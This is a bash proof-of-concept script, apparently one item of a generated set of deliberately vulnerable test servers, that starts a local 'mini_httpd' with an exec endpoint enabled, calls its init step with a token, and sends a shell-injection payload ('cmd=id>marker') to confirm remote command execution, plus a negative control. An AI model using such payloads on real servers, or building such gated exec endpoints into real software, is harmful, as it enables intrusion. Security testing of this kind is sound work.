#!/usr/bin/env bash
# PoC for 146_mini_httpd_C3I3S3
# Axes: C3 (config file + runtime init) / I3 (struct dispatch) / S3 (config-gated metachar)
#
# C3: config has exec_mode=1 + exec_secret; must call /exec/init?token= first.
# S3 bypass: omit --strict-exec; strict_exec stays 0, metachar check never runs.
# Negative control: start with exec_mode=0; init fails (403), /exec returns 404.

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/mini_httpd"
WWWROOT="/tmp/poc_146_www"
MARKER="/tmp/poc_146_marker"
CONFIG="/tmp/poc_146.conf"
PORT=18146
NEG_PORT=19146
INIT_FLAG="/tmp/mini_httpd_exec_init_146"

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY -- run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONFIG" "$INIT_FLAG"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"
rm -f "$INIT_FLAG"

# write config file with exec_mode=1 and exec_secret
cat > "$CONFIG" <<'EOF'
exec_mode = 1
exec_secret = s3cr3t
EOF

# start server with config but WITHOUT --strict-exec (S3 bypass)
echo "[*] starting mini_httpd with --config $CONFIG (no --strict-exec) on port $PORT..."
"$BINARY" -p "$PORT" -d "$WWWROOT" -D --config "$CONFIG" &
SERVER_PID=$!
sleep 0.5

# init step: call /exec/init?token=s3cr3t to create flag file
echo "[*] calling /exec/init to create init flag file..."
curl -sf "http://127.0.0.1:${PORT}/exec/init?token=s3cr3t" > /dev/null || true
sleep 0.2

# trigger exploit -- I3: struct dispatch, S3: bypassed (strict_exec=0)
echo "[*] sending payload: cmd=id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null || true
sleep 0.2

# verify
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found -- exploit failed"
    exit 1
fi

# negative control: start with exec_mode=0; init fails (403), /exec returns 404
echo "[*] verifying gate: endpoint absent with exec_mode=0..."
kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0
rm -f "$INIT_FLAG"
NEG_CONFIG="/tmp/poc_146_neg.conf"
echo "exec_mode = 0" > "$NEG_CONFIG"
echo "exec_secret = s3cr3t" >> "$NEG_CONFIG"
"$BINARY" -p "$NEG_PORT" -d "$WWWROOT" -D --config "$NEG_CONFIG" &
SERVER_PID=$!
sleep 0.5
# attempt init (should fail with 403)
curl -sf "http://127.0.0.1:${NEG_PORT}/exec/init?token=s3cr3t" > /dev/null 2>&1 || true
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0
rm -f "$NEG_CONFIG"
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 with exec_mode=0"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
